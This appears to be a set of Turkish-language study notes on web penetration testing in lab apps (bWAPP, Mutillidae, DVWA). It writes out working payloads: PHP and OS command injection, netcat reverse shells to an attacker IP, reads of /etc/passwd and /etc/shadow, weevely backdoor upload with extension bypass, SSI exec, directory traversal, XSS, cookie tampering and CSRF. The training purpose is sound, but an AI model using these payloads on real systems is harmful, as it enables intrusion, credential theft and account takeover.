+bazne dirbuster ile bulduğumuz sonuçları adres çubuğuna yazarak ulaşamadığımız durumlarda iframe enjeksiyonu yapabilirsek bu sonuçlara bu şekilde ulaşabiliriz 
+ve eğer iframe enjeksiyonu yapaibliyorsak HTML enjeksiyonu da yapaibliyor olaibliriz örnek vermek gerekirse bunu burpsuit de deneyebiliriz tekrar sağ üstten iframe injection u seçiyoruz burp suite geliyoruz 
+prıxyZintercept>intercept on yapıyoruz şimdi gelen giden istekleri yakalayabilecek burp şimdi tekrar bwapp e gelip iframe enjeksiyonu bölümünü seçiyoruz ve otomatik olarak bizi burpsuit e götürecek 
+intercept>raw bölümünde burada iframe.php ye gideceğini söylüyor forward diyoruz get isteği geldi iframe.php yi açacağım diyor buna da forward diyoruz  ve daha sonra bir get isteği daha geliyor 
+bu gelen stekte de robot.txt widht 250 height 250 olduğunu görüyoruz  bu değerleri değiştirebiliriz buraya bir html enjeksiyonu yapabilir miyiz bunu da deneyebiliriz en son 250den sonra 250"> </iframe> yazıyoruz 
+v html kodları yazmaya devam edebiliriz </iframe><h1>helloworld</h1> şeklinde yazıyoruz devamında ve paketi bu şekilde forwardlıyoruz daha sonra bwapp sayfamıza geldiğimizde aşağıda hellow world ümüzü h1 etiketi 
+içerisinde yazıldıuğını ve html enjeksiyonumuzun başarılı olduğunu görüyoruz // bu şekilde burp suite ile requestlerimizi değiştirerek yollayabiliyoruz
+
+bu dersimizde php enjeksiyonunu öğreneceğiz 
+yine bwapp de sağ üatten php code injection kısmını seçiyoruz bunu seçip sağ taraftaki hack butonuna basarsak bunu test edebileceğimiz sayfa açılacaktır 
+burpsuit kullanıyorken proxy nin açık olduğundan kullanmıyorken de kapalı olduğundan emin olmamız gerekiyor 
+mozillanın içerisinden ve burp progrmıandan proxy yi aktif ediyoruz 
+intercept i açıyoruz bwapp de reflecting back your "message" yazısında "message" kısmına tıklıyoruz tıklayınca intercept ediyor isteği yakaladık (get isteği) 
+proxy > intercept > raw kısmının ilk satırında message=test diye bir ifade görüyoruz bu birazdan isteği forwards ettiğimizde ekranımıza yazdırılacak mesajın içeriğini ifade eder 
+forward diyoruz ve test yazısı çıkıyor sayfamızda url de de message=test ifadesini görmekteyiz linuxda ; (noktalı virgül) ifadesi kod birden fazla kodu peş peşe çalıştırma imkanı sağlar bize örneğin 
+root kullanıcısında olduğumuzu varsayalım whoami;pwd dersek terminl bize önce hangi kullanıcıda olduğumuzu yani root çıktısını daha sonra da hemen bir alt satırında o an terminaldeki mevcut konumumuzu yazdıracatır 
+php enjeksiyonu işlemimizde de buna benzer bir uygulama yapabiliriz url kısmına message= kısmında sonra hello;system("whoami) yazarsak ---------> message=hello;system("whoami") bize hellowww-data çıktısını verecektir 
+kodumuz çalıştı demekki güncel kullanıcı / bu websiteswinin sunucusu www-data kullanıcısında çalışıyormuş burdan şunu anlıyoruz php koduna bir enjeksiyon yapabiliyoruz ve bazı komutları çalıştırabiliyoruz 
+/etc/passwd dosyasının içerisinde kalide farklı servislere ait olan ve o servislerde kullanabileceğimiz kullanıcı adları ve şifreler var şifre kısmı x şeklinde belirtilmişc yani gizlenmiş 
+/etc/shadow dosyasında da şifrelerimiz hashlenmiş yani şifrelenmişbir şekilde görüntülenebilir ama yine de passwd ve shadow daki bilgiler eşleştirilerek bu şifrelerin kırılma işlemi yapılabilir o yüzden bu dosyaları 
+kimsenin görmemesi gereklidir  message=hello;system("cat /etc/passwd")   yazarsak sunucudaki bu konumdaki dosyanın içeriğini tarayıcımıza yazdırır yinne aynı şekilde message=hello;system("cat /etc/shadow")
+komutunda da her enjeksiyonun çalışcağı gibi bir durum yok bazıları için koruma olabilir örneğin /shadow dosyasını yazdıramadık 
+daha da ötesi bu siteye bir shell açıp bu siteyi hackleyebilriz örneğin netcat açabiliriz netcat ile bir porta bilgi yollayabiliriz ama önce biz nc -nvlp 1234 yazarak 1234 portundan bilgi al bu portuma bir bağlantı
+isteği gelirse gönderen ile bağlantı kur anlamında bu komutu yazıyoruz / 1234 portumuzu dinlemeye alıyoruz daha sonra da url den bir enjeksiyon yaparak da bağlantı açmaya çalışacağız 
+message=hello;system("nc 10.0.2.4 1234 -e /bin/bash") yazıyoruz eğer /bin/bash çalışmazsa /bin/sh da denenebilir diyip netera bastığımızda kaliye dönüyoruz ve dinlediğimiz terminal tab ına gleiyoruz bağlantmızın geldiğini görüyoruz 
+şuan bee box sanal makinesi ile bir bağlantı kuruldu ve burada komut çalıştırabiliriz 
+python -c 'import pty;pty.spawn ("/bin/sh")'
+python -c 'import pty;pty.spawn ("/bin/sh")'
+eğer sunucuda yukarıdakiler gibi bir python kodu çalıştırabiliyorsak bir shell açabiliriz sunucuda şuan mevcut kullandığımız terminalde isteidğimiz bütün işlemleri yapamayabiliriz örneğin dosya uplad veya download 
+işlemleri veya root a yükseltme işlemleri gibi bunun gibi işlemleri yapmak için tam yetki sahibi olabileceğimiz bir shell açmak çok faydalı olacaktır bu gibi durumlarda gerçekten o makinadaymış o makinanın kendi 
+terminalini kullanıyormuş gibi yapmaya çalışmak çok daha mantıklı olacaktır  bu durumda da yukarıda belirttiğim 2 koddan birini kopyalayıp terminale yapıştırıp entera basmamız yeterli olacaktır 
+python -c 'import pty;pty.spawn ("/bin/sh")' örneğin bu bir python komutudur pty isimli bir python kod kütüphanesini import edeceğini yani kullanacağını söylüyor ondan sonra bu kütüphanedeki kodları kullanarak bir 
+shell açmaya çalışıyor bunu kopyalayıp çalıştırdığımızda sanki o makinanın terminaline fiziksel olarak erişmiş gibi bir yetkiye sahip oluruz buradan çıkıp işlemimizi sonlandırmak için de ctrl+c yapabiliriz 
+böylece oturumumuz sonlanır shell açtıktan sonra içeride dilediğimiz işlemi dosya silme yükleme indirme oluşturma vs işlemleri gerçekleştirebiliriz 
+
+bu dersimizde dosya upload etmek ile ilgili bir açığı öğreneceğiz 
+bu açığımızın ismi unrestricted file upload (sınırsız dosya yükleme)
+bu açıkT örneğin siteye bir resim yüklemek yerine yani .png veya .jpeg dosyaları yüklemek yerine sitede düzgün bir filtreleme olmadığı için siteye .php dosyalrını yükleyebiliyoruz 
+yükleyeceğimiz php dosyası için bir zararlı payload oluşturmamız gerekiyor bunun için de weevely toolunu kullanabiliriz bu tool bize bir php payloadı oluşturmamıza yardımcı olur sonra bu dosya hedef cihazda çalıştırı 
+ldığında geri dönüp bize shell de oluşturuyor yani netcat i kullanmamıza gerek kalmıyor biz bu payload ı Documents içinde oluşturmak istediğimiz için öncelikle terminalde cd Documents yazıyoruz 
+weevely generate 123456 myweevely.php yazıp entera basıyoruz [123456 dosyamızın şifresidir] mywevely.php dosyamızın ismidir / generate = dosya oluşturma komutudur 
+bu dosyamızı alıp bwapp deki unrestricted file upload açığının olduğu upload kısmına yüklüyoruz ardından the image has been uploaded -here- kısmına tıkladığımız zaman yüklediğimiz yerin bağlantı linkine ulaşabiliriz 
+bu URL yi az önce belirlediğimiz şifre ile weevely e gireceğiz siteyi dinlemek için bwapp de nereye yüklendiği açık bir şekilde yazıyor eğer açık bir şekilde yazmıyor olsaydı burpsuit ile intercept ederek gelen 
+responselardan göreiblirdik 
+şimdi weevely ye geri dönüyoruz weevely dosyanın-yüklendiği-url 123456 yazıp entera basıyoruz ve bağlamtı gerçekleşti whoami yazı www-data çıktısını alırız bu sistemdeki bir kullanıcıdır sisteme girdiğimizin bir kanıtıdır yani 
+bu oturumumuzu sonlandırıyoruz ve tekrar bwapp in sitesine geliyoruz daha sonra unrestricted file upload açığın gelip set your security level kısmını low dan > medium a alıyoruz bu yaptığımız ayar ile bu açık için 
+güvenlik seviyesini daha da yükseltmiş oluyoruz peki bunu nasıl anlayacağız şöyyle ki az önce yüklemiş olduğumuz .php dosyasını tekrar yüklemeyi deniyoruz ve şu hata mesajı ile karşılaşıyoruz 
+sorry, the file extension is not allowed. the following extension are blocked *asp,aspx,dll,exe,jsp,php* yani bu dosya uzantılarına sahip dosyaların upload edilemsi engellenmiştir diyor peki bunu nasıl atlatacağız 
+bunu atlatmanın bir yolu var o da dosyamızın uzantısını değiştirmek bunun için de linux da kopyalama komutu olan cp yi kullanabiliriz terminale geliyoruz cp myweevely.php myweevely.php3 yazıp entera basıyoruz
+bu komut ile .php olan dosyamızın uzantısını php3 yaptık yani php versiyonlarından birinin uzantısı gibi yaptık böylece kara listede sadece php olduğu için bizim dosyamızın bir php olduğunu anlamayacak 
+ama dosyamız yüklenip çalıştırılabilecek weevely dosyanınyüklendiğiurl 123456 yazıp tekrar dinleme işlemini yapabiliriz bu uygulama için de 
+eğer php3 çalışmıyorsa4/5/6/7 denenebilir 
+
+bu dersimizde komut çalıştırma açıklarını ve bunları nasıl kullanabileceğimizi öğrenmeye devam ediyoruz bu uygulamada burpsuit kullanacağız 
+normalde burpsuit i kullnırken burp u açarken mozilla ayarlarından proxy i seçmemiz kullanmıyorken de kapatmamız gerekiyor bu her işlem yaparken yorucu olacağınzdan dolayı bunun için güzel bir eklenti kullanacağız 
+ismi foxy proxy https://addons.mozilla.org/tr/firefox/addon/foxyproxy-standard/ adresinden eklentimizi firefox a ekleyebiliriz eklentiyi kurduktan sonra sağ üstte eklentiler kısmında gözükecektir eklentimizin simgesine 
+tıklayıpp optiopns kısmına geliyoruz sağ tarafta yer alan kısımda turuncu tıklanaiblir add yazısına tıklıyoruz ve proxymizi oluşturuyoruz sol üstten proxy mizin başlığını seçiyoruz örneğin BurProxy olaiblir 
+proxy type > HTTP olacak proxy ip adress or dns name kısmına > 127.0.0.1 adresini giriyoruz port kısmına > 8080 pattern shortcuts başlığının altındaki add whitelist pattern to match all URLs kısmı ON olacak 
+Enabled kısmı ON olacak Do not use localhost or intranet/private IP adresses kısmı da OFF olacak ve sağ alttan Save diyoruz ve proxy artık eklentimize eklendi sağ üstten eklenti simgesine tıkladığımız zaman 
+BurProxy nin yeşil renkte yazıldığını görüyoruz buna tıkladığımız zaman proxy miz etkin olacaktır     
+
+Bu dersimizde OS Command Injection açığını öğreneceğiz 
+bwapp den sağ üstten os command injection a tıklayıp hack diyoruz sayfa açılıyor 
+burada herhangi bir domain adresini girip bu domain adresinin sahip olduğu ip adresini sorguluyoruz ve karşımıza çıktı olarak geliyor 
+burp suiti açıyoruz bu işlemi daha iyi anlamak için burada gönderilen ve gelen istek ve cevapları inceleyebiliriz ama bunun gibi bir input girip bir çıktı aldığımız 
+sistemlerde bu inputta bir kod çalıştırabilir miyiz bunu öğrenmemiz lazım örneğin www.google.com;ls/whoami vs çalıştırmayı denediğimizde çalıştığını görüyoruz 
+bu komut çalıştığına göre biz acaba buradan yazdığımız bir komut ile netcat den bu sitenin bulundurulduğu sunucuya bağlanabilir miyiz bunu deneyeceğiz 
+kali de terminalimize gelip nc -nvlp 1234 yazıp enterlıyoruz daha sonra bwapp in sitesine gelip input kısmına www.google.com;nc 10.0.2.4 (kalimizin ip adresi) 1234 -e /bin/bash 
+daha sonra kaliye geçince bağlantı yapabildiğimizi görüyoruz bir de security level > medium da deneyelim ls whoami gibi komutların blocklandığını görüyoruz 
+; ve && komutlarını medium da blockluyor ama grep yani | komutunu blocklamadı ve komutumuz çalıştı payloadımız da ww.google.com|pwd 
+bu tür komuttan kaynaklı güvenlik açıklıklarını manuel olarak tek tek denememize gerek yok bunu otomatie edilmiş olarak bir tool ile deneyebiliriz bu toolun adı da commix 
+terminale commix yazarak çalıştırabiliriz commix -h yaparsak bu toolun help sayfasına ulaşabiliriz burp suiti açık paketleri intercept ettiğimizde 
+target > site map > command.php > baştan 4. paket olan post paketinde cookie bilgisini görüyoruz 
+cookie (çerez) Çerez, herhangi bir İnternet sitesi tarafından bilgisayara bırakılan bir tür tanımlama dosyası. Çerez dosyalarında oturum bilgileri ve benzeri veriler saklanır.
+commix gibi tarama araçları bazı siteleri tarsrken site bu taramayı bir tehdit olarak kabul edip bağlantımızı sonlandırabilir ya da sitede oturum açmadığımız için bizi blocklayabilir 
+commix de sanki sitede oturum açmış ve bu açıkları manuel olarak deniyormuş gibi görünmek için çerez bilgilerimizi girerek işlem yapabildiğimiz bir parametre bulunur 
+bunu yapmak için kullanacağımız komut commix --url="tarama-yapacağımız-url" --cookie="brupsuit-den-intercept-ettiğimiz-cookie" --data="taregt=www.google.com&form=submit"
+(data kısmı hemen cookie'nin altında yer alan bölümdeki değerlerdir) bunları yazdıktan sonra enterlıyoruz açığı bulduktan sonra bize bir soru sorucak y yazıp shell ile sunucuya bağlanıyoruz 
+daha sonra dilersek ctrl+c ile işlemi sonlandırabiliriz 
+bu dersimizde ssı injection (server-side includes) öğreneceğiz 
+SSI'ın açılımı Server Side Includes'dur. Gerçek SSI'ın kendine ait bir programlama dili vardır ve sunucuda çalıştırılan kullanıcı tarafından kendi sayfalarına çağırılabilen dinamik bilgilere denir. 
+ssi sunucu tarafında çalıştırılan bir programlama dilidir dinamik içerikleri html sitelerine daha kullanıcı görmeden yükleyebilmek için web developerlar tarafından kullanılır
+eğer bir web sitesinde .shtml , .stm .shtm  uzantılı dosyalar / içerikler görürsek o sitede ssi kullanılıyor demektir 
+bir ssi kodunun kullanım şekli şöyledir <!--yazılacak-kod -->  şeklinde yazılır yani htmldeki yorum satırı gibi kod buranın içerisine yazılır 
+kullanılan komutlardan bazıları şunlardır exec = uygulama komutudur / bu komut ile komut çalıştırılabilir (ls vs gibi)
+include = bu komut ile dosyalar yüklenir 
+echo = yazdırmak için kullanılır 
+bwapp den sağ üstten server-side includes seçeneğini seçerek ulaşabiliriz bu zaafiyete 
+tıklayıp hack dediğimizde açılan kısımda firstname inputuna <!--#exec cmd= "ls" --> yazıp lookup a bastığımızda ls komutumuzun çalıştırıldığını görüyoruz 
+ <!--#exec cmd= "nc 10.0.2.4 1234 -e /bin/bash" --> yazarak da netcat çalıştırabiliriz 
+ bu dersimizde ssi ın medium security level ını deneyeceğiz ve onu hacklemeye çalışacağız 
+ <!--#exec cmd= "ls" --> komutumuzdaki tırnak işaretlerini kaldırıp <!--#exec cmd= ls --> şeklinde denediğimizde çalıştığını görüyoruz demekki bu kısımda " " (tırnak işareti)
+ lerinin kullanımı ile ilgili web devoloper bir filtreleme yapmış 
+ bu dersimizde file inclusion ve directory traversal ın ne olduğunu öğreneceğiz 
+ normalde erişim yetkimizin olmadığı ama bir bug sebebiyle bu dosyaya erişim sağlayabildiğimiz bir konfigrasyon açığıdır 
+ bu açık sayesinde normalde web sitesi klasörlerinde içerisinde olmayan dosya veya klasörleri görebiliriz sağ üstteki açık çeşitlerinden directory traversal-directories 
+ dizinleri / klasörlere ulaşabildiğimiz açık türünü directory traversal-files da dosyalara ulaşabildiğimiz açık türünü ifade eder
+ bu uygulamamızda directory traversal-files açığını uygulayacağız bunu seçip hack dedikten sonra url de .php olduğunu yani php kullanıldığını ve devamında page=message.txt 
+ parametresi kullanıldığını görüyoruz gelen giden istekleri daha iyi görmek için burpsuit i açıyoruz
+ önce foxy proxy mizi mozilla üzerinden açıyoruz burproxy i etkinleştirip daha sonra burpsuit den intercept i açıyoruz burpsuit de proxy>intercept>params kısmında gelen giden 
+ isteklerde kullanılan parametreleri gösteriyor bize url deki message.txt dosyası sunucudaki linux sistemin /var/www/html/ dizininin içerisinde bir yerlerde olması gerekiyor 
+ çünkü bu dizin websitesi içerisinde gösterilen dosyaların tutulduğu bir dizindir nerede olduğunu bilmiyoruz çünkü ona yetkimiz yok 
+
+ bu dersimizde directory traversal açıklarını öğreneceğiz 
+ page=parametre kısmında page=. deniyoruz bize bir hata verecek mi diye this file doesnt exist dedi yani böyle bir dosya yok hatası verdi ama basit ctflerde genelde xxx klasöründe 
+ veya dizininde böyle bir dosya yok hatası verir biz de belirttiği o klasör üzerinden başka bir parametre deneriz ama burada böyle bir hata vermedi
+ page=../ komutu ile bir dizin geri gider bu şekilde yazıp entera basıp deneyebiliriz bizim uygulamamızda bu parametre çalıştı page=/etc/passwd parametresi de çalıştı 
+ şimdi security level ı medium yapıyoruz ve başka bir şey deneyeceğiz page=../../../etc/passwd yaptığımızda directory traversal detected yaptı ve bizi engelledi çünkü 
+ dizinler arası geçiş yaptığımızı farketti ../ ile ilgili bir koruma filtrelemesi mevcut ama page=/etc/passwd yaptığımızda yine çalıştı
+ page=/proc/self/environ yapıpı enterladığımızda permission denied hatası aldık çünkü bu dosyayı açmaya yetkili bir kullanıcı değiliz sunucuda 
+ bu dersimizde directory traversal ı bir tool ile otomatize ederek aramayı öğreneceğiz bu toolumuzun ismi dotdotpwn 
+ directory traversal-files ve directories ikisinde de aynı parametreleri kullanrak bu açığı sömürebiliriz 
+ kalide terminalde dotdotpwn yazıp enterlıyoruz eğer yüklü değilse apt-get install dotdotpwn komutunu çalıştırıyoruz 
+ dotdotpwn -m http -h directory-traversal-acıgının-urlsi (sonu page=message.txt olarak bitmeli ve url nin başındaki http:// kısmını siliyoruz ) ve enterlıyoruz eğer denediğimiz 
+ site https ise komutumuzun en sonuna -S parametresini koyup deneyebiliriz 
+ bu araç örneğin ../ site tarafından filtrelenip engellenmiş ../ karakterlerinin HEX kaşılığını deniyor ve o şekilde bir açık bulmaya çalışıyor 
+ Heksadesimal, 16 tabanlı sayı sistemidir. Hxx bilgisayar belleğindeki 8 bit'lik bayt'ları göstermek için kullanılan bir kestirme yoldur. Bu sayı sistemine "16 tabanlı sayı sistemi" denilmesinin nedeni, 16 tane sembolden oluşmasıdır. Sembollerden 10 tanesi rakamlarla, geri kalan 6 tanesi harflerle temsil edilir.
+ kali ve windows makinemiz nat network de iken kaliden bwapp sitesine bağlanıyoruz sağ üstten cross site scripting reflected GET seçeneğini seçiyoruz 
+ açılan pencerede first name kısmına <script>alert("hacked);</script> yazıyoruz ve last name e de sam yazıyoruz go diyip inpputumuzu submit ediyoruz 
+ daha sonra ekranımıza bir alert notification kutusunda hacked yazışı yazılmış oluyor bu payloadımızın başarılı olduğunu gösterir 
+ https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt buradaki linkte xss açığı oluşturabilecek bazı payload lar bulunuyor 
+ bunları deneyerek xss açığı var mı yok mu kontrol edebiliriz 
+ örneğin mesela az önceki payloadımız filtrelenmiş olabilir ve çalışmayabilir eğer çalışmazsa <ScRipT>alert("XSS");</ScRipT> payloadını deneyebiziliriz bu payload da 
+ script yazmak yerine büyük küçük harf kullanmış ve bu filtrelemeden kaçmaya çalışmış 
+ örneğin iframe tagini kullanarak böyle bir payload da kullanabiliriz <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+ şimdiki uygulamamızda ise xss in security level ını medium olarak ayarlayıp deneyeceğiz 
+ </script><script>alert(1)</script> bu payloadı denersek çalıştığını göreceğiz çünkü filtreleme eğer başta <script> tagi kullanılırsa bu kodun tamamını sil şeklinde yapılmış
+ biz script tagini kapatıp kodu yazmaya başlıyoruz daha sonra tekrar açıyoruz bu kodumuzun çalıştırılacağı kısım daha sonra alet mesajımızı yapıp tekrar yapatıyoruz 
+ ve kodumuz çalışmış oluyor 
+ bu dersimizde cross site scripting reflected ajax / json seçeneğini seçiyoruz sağ üstten daha sonra mozilladan foxy proxy yi etkinleştiriyoruz ve burp suiti açıyoruz 
+ ardından intercept i açıyoruz atil yazıp  entera bastığımızda siteye gelen isteği burp yakaladı ve giden istekte title diye bir değer olduğunu görüyoruz halbuki bu ifadeki 
+ browserdan sitenin url sinde görmemiştik ama burp bunu yakaladı daha sonra intercept i kapatıyoruz eğer input yerine bir şey yazdıkça bize bir çıktı vermiyorsa bulamadık gibi 
+ bug a girmiş olabilir tekrar aynı xss sayfasını açabiliriz bunu düzeltmek için bu input içerisinde <h1> </h1> kodunu çalıştırabiliyoruz acaba bir xss payloadı çalıştırabilecek miyiz 
+ bunun için bir payload deneyeceğiz <img src=a onerror=alert(1)> kodunu çalıştırdığımızda ekrana bir alert verildiğini göreceğiz yani payloadımız başarılı oldu 
+ burada yapılan uygulama öncelikle img src ile bir resim yüklemek istedik resime bir kaynak vermedik sadece a karakterini verdik ardından onerror komutu ile eğer bu resim 
+ yüklenirken bir hata olursa hata alırsa .... yap gibi bir komut verebiliyoruz onerror=alert(1) dediğimizde de zaten resmin source unu vermemiştik bu yüzden hata aldı hata alınca da 
+ kodun ikinci kısmı çalışarak ekrana bir alert mesajı bastırılmış oldu  ancak şöyle bir problem var bu bir reflected açığı olduğu için bu zaafiyeti hedef bir cihazla exploit 
+ etmemizi sağlayacak bir url ye ihtiyacımız var ancak alert i çalıştırmamıza rağmen url miz sayfayı ilk açtığımızdaki gibi zaafiyeti  sömürebileceğimiz url yi nasıl bulacağız 
+ bunun için yine burp suit i kullanıyoruz sağ üstten tekrar foxy proxy i açıyoruz ardından intercept i açıyoruz  payloadı tekrar yazıp intercept etmesini bekliyoruz 
+ yakaladıktan sonra proxy > intercept > raw kısmının ilk satırında GET den sonra intercept edilen url yi kopyalayıp tarayıcımızınn adres çubuğuna yapıştırıyoruz ve 
+ açılan yeni sayfada alertimizi aldık yani exploit edecek url yi bulduk 
+ bu dersimizde cross site scripting stored (blog) açığını uygulayacağız sağ üstten seçip hack diyoruz 
+ ardından açılan blog sayfasının input kısmına  <script>alert("hacked);</script> kodunu yazıp sebmit diyoruz ve alert mesajını alıyoruz bu kodun çalıştığını gösterir ancak
+ biz submit ettiğimiz input bir javascript olduğu için ve submit ettiğimiz şey de bir yorum veya bir gönderi yükleme gibi bir şey olduğu için bu artık siteye eklendi 
+ ve siteye eklendiği için sadece bizim tarayıcımızda değil bu sayfaya girecek olan herkesin tarayıcısında bu alert mesajı çıkacaktır bu yüzden reflected e göre daha tehlikelidir 
+ ve bounty si de daah yüksektir :) 
+ daha önce eklemiş olduğumuz payloadları silmek için submit butonunun sağındaki add kutuçuğunun tikini kaldırıp delete kutucuğunun tikini işaretliyoruz sadece ardından subnit 
+ e basıyoruz ve siliniyor 
+ancak az önce çalıştırdığımız kod sitede filtrelenmiş / blocklanmış olabilir bu yüzden </script><script>alert(1)</script> payloadını yazıp submitliyoruz ve çalıştıığını görüyoruz 
+ bu dersimizde csrf açığını öğreneceğiz ama onu öğrenmeden önce metasploitable sanal makinasını kurmamız gerekiyor nasıl kurulduğunu ehok 537 . satırda anlattım 
+ metasploitable makinemizi açıyoruz ve msfadmin kullanıcı adıyla ve msfadmin şifresiyle giriş yapıyoruz vm imizin ip adresini öğrenmek için fconfig komutunu çalıştırıyoruz 
+ ardından kalimizin tarayıcısından metasploitable ın ip adresini adres çubuğuna yazıyoruz önümüze gelen seçeneklerden mutillidae yi seçiyoruz bu site en çok görülen açıkları 
+bulup pratik etmemize olanak sağlıyor diğer seçeneklerden olan DVWA de açıklar barındıran bir web sitesidir biz mutillidae sitesine tekrar dönüyoruz ve sağ üstte not login diyor yani 
+siteye giriş yapmadık giriş yapmak için üstteki siyah barın olduğu satırda Login Register seçeneğine tıklıyoruz Login butonunun altında Please register here kısmından kendimize 
+yeni bir üyelik oluşturuyoruz eğer oluştururken metasploit.accounts doesnt exist hatası alırsak Database i setup yapmamızı istiyor  bunu yapmak için açık olan metasploitable 
+vm ımıza geliyoruz burada tek sefere mahsus olarak bir dosyayı değiştirmemiz gerekiyor terminakde iken sudo nano /var/www/mutillidae/config.inc yazıp enterlıyoruz (türkçe klavyede
+. (nokta) ya basarak slash / karakterini oluşturabiliriz ) entera basınca tekrar şifremizi isteyecektir msfadmin yazıp devam ediyoruz eğer bomboş simsiyah bir ekran açılırsa büyük ihtimalle 
+şifreyi yanlış girmişiz demektir ctrl+x yapıyoruz ve çıkıyoruz açılan dosyada $dbname satırını 'owasp10' : (sadece tırnak içindeki kısmı sil ve owasp10 yaz) ctrl+o ile kaydediyoruz 
+ve ctrl+x yapıp çıkıyoruz şimdi tekrar kali makinemize geri dönüyoruz tekrar register sayfasından bir üyelik oluşturuyoruz ardından oluşturduğumuz username ve password ile login kısmından 
+girşimizi yapıyoruz 
+mozilla da sağ tık yapıp inspect element diyoruz > açılan bölümden storage tabını seçiyoruz bu tabda cookie denilen bir sayfaya bir defa giriş yaptığımızda tarayıcıyı hrt kapatıp açtığımızda 
+tekrar login olammak için bazı oturum (session) bilgilerimiz tutuluyor storage kısmından cookie kısmını seçiyoruz ve sağda çıkan verilerden uid çıktısı unic id genelde 
+veri tabanlarında kullanılır yeni bir kullanıcı eklendikçe ona bir unic id atanır bu aynı kullanıcı adından birden fazla varsa onun hangi kullanıcı olduğunu ayırmamıza yarar 
+eğer cookieler düzgün bir şekilde ayarlanmadıysa biz buradaki değeri değiştirip başka bir kullanıcı ile sitede gezinmeye çalışabiliriz örnek vermek gerekirse bizim değerimiz 
+17 ise bu bizden önce 16 tane daha kullanıcı var demektir uid satırındaki Value sütunundan 17 yazan inputa çift tıklayarak bu değeri değiştirebiliriz değeri 1 yapıyoruz 
+ve sayfayı yenilediğimizde admin olaeak giriş yaptığımızı görüyoruz cookie de bu tarz bir güvenlik önleminin alınmamasının ismi isecure session managment dır 
+bunu manuel olarak inpect element diyip yapmak yerine https://addons.mozilla.org/tr/firefox/addon/a-cookie-manager/ gibi cookie manager extensionları yükleyebiliriz 
+
+bu dersimizde csrf e giriş yapacağız şuan admin olarak bağlıyız bu şekilde bir bug bulmak mantıklı olmaz çünkü zaten admin olduğumuz için herşeye erişimimiz yetkimiz var 
+mozillada sağ tık inspect element > storage > cookies > uid yi 17 yapıyoruz (ilk girdiğimizde kaç ise onu tkerar yapıyoruz)
+mutillidae sitesinde sol üstteki seçeneklerde OWASP Top 10 den A5 Cross Site Request Forgery (CSRF) > add your blog kısmına giriyoruz csrf istek sahtekarlığı demektir 
+en çok da şifre değiştirmede karşımıza çıkar açılan sitede input kısmına test yazıp Save Blog Entry butonuna basıyoruz şimdi burpsuit i açıyoruz 
+intercept ve foxy proxy i açıyoruz ardından bir entry daha giriyoruz test 2 yazıp save blog entry e tıklıyoruz 
+tıkldığımızda zaten direk olarak burpsuit önümüze açılacak ama açılmazsa proxy > intercept > raw kısmında 14. satırda en sonraki satırda neler yollandığını görebiliriz 
+Params kısmında daha düzenli gözüktüğü için oraya giriyoruz şimdi bu parametreleri değiştirip yolladığımızda başkası adına yollamış olabilir miyiz acaba 
+buradaki uid satırındaki  value yi 1 yapıp forwar tuşuna basıyoruz ve sitemize geri döndüğümüzde admin olarak giriş yaptığımızı bu entry yi adminin attığını görebiliriz 
+ardından metasploitable ın ip adresini kali de browserımızın adres çubuğuna yazıyoruz ve açılan sayfadan DVWA e tıklıyoruz soldaki seçeneklerden sondan 4.cü olan 
+DVWA Security olan seçeneğe tıklıyoruz script security level ını low yapıyoruz ardından baştan altınca seçenekteki CSRF kısmına tıklıyoruz ve intercept i açıyoruz 
+biz bu siteye admin olarak bağlandığımız için bizi admin olarak görüyor bu yüzden bu şifreyi değiştirebiliyoruz şifreyi test test olarak değiştiriyoruz 2. test confirm için 
+burp e  gelip params kısmından parametreleri görebiliriz forward yaptığımızda da şifrenin değiştiğini görebiliriz Password Changed yazısından 
+bu dersimitde csrf açığını kullanarak basit bir hack işlemi nasıl yapılır bunu öğreneceğiz  DVWA den > CSRF sekmesine tıklıyoruz şifreyi test2 test2 yapıyoruz ve burp suit den 
+intercept i açıyoruz ardında change diyoruz tıkladığımızda isteği yakalar açılan brupsuit penceresinde çıkan result a sağ tıklayıp send to repeater (kısayolu ctrl+r dir)
+repeater a yolladıktan sonra proxy nin bulunduğu satırda repeater sekmesi turunu bir şekilde gözüküyor buraya tıklıyoruz bu repeater ın özelliği sol tarafta bir istek yaparız 
+ve sağ tarafta da bu isteğimize karşı verilen response u görürüz burpsuit bu isteği alıp hedef server a yapıyor ve server ın response unu programda çıktı olarak veriyor 
+sol üstten send yaparak isteğimizi yollayabiliriz hemen sağ trafta cevabımız düşüyor sağ taraftaki sekmelerde çıktıların dğeişik şekilde ifade edilişi yer alıyor 
+render kısmında bu cevabın görsel olarak bir görüntüsü yer alır ancak community editionda bu özellik çalışmıyor hex kısmında response un hex değerleri ile ifade edilişi yer 
+alır raw kısmında da response un html kodlarını ve http response larını görebiliriz  raw kısımnda biraz aşağı indiğimizde 65. satırda Password Changed şeklinde şifremizin değiştirildiği 
+mesajını görüyoruz ardından request raw kısmında 1. satırdaki password_new=test2 olarak değiştiriyoruz ki şifre değiştirirken şifreler birbirleriyle uyuşmazsa ne gibi bir cevap alacağız bunu gözemlemek için 
+değiştirip sol üstten send diyoruz response raw 65. satırda passwords did not match yani şifreler uyuşmadı eşleşmedi çıktısını alıyoruz daha sonra request raw a girip 
+test2 yaptığımız yeri tekrar test yapıyoruz ve sağ tık yapıp copy url yapıyoruz bu GET isteğini bunu yapmamızdaki amacımız da şu örneğin bu GET isteği instagram da olsaydı 
+bu url yi birine attığımızda o da açtığında acaba şifresini değiştirebilecek miydik bunu öğrenmek için intercept i kapatıyoruz kop yaladığımız url yi tarayıcımızda yeni bir sekmede 
+yapıştırıyoruz DVWA > CSRF kısmında sağ altta view source kısmına tıklarsak burada kullanılan php kodlarını görebiliriz böylelikle eğer web developer lıkla uğraşıyorsak 
+kendi uyuglamalarımızı daha güvenli yapmak istiyorsak bu sayfada security level ın low medium high olduğu durumlarda kodların nasıl değiştiğini fakrlılıkları gözlemleyebiliriz
+view source tıkladıktan sonra sol altta compare kısmına basarsak detaylı bir şekilde kodları görüntüleyebiliriz adres çubuğuna kopyaladığımız url deki değiştirme 
+işlemindeki kısımları test2 test2 yapıyoruz new password ve password confirm kısmındaki tesleri ardından entera bastığımızda şifre değişti diyor bunu doğrulamak için sol attan 
+logout diyip mevcut oturumumuzu sonlandırıyoruz ardından username i admin şifreyi eski şifremiz test yapıyoruz bağlanmıyor şifreyi test2 diyip login diyoruz ve bağlanıyoruz   
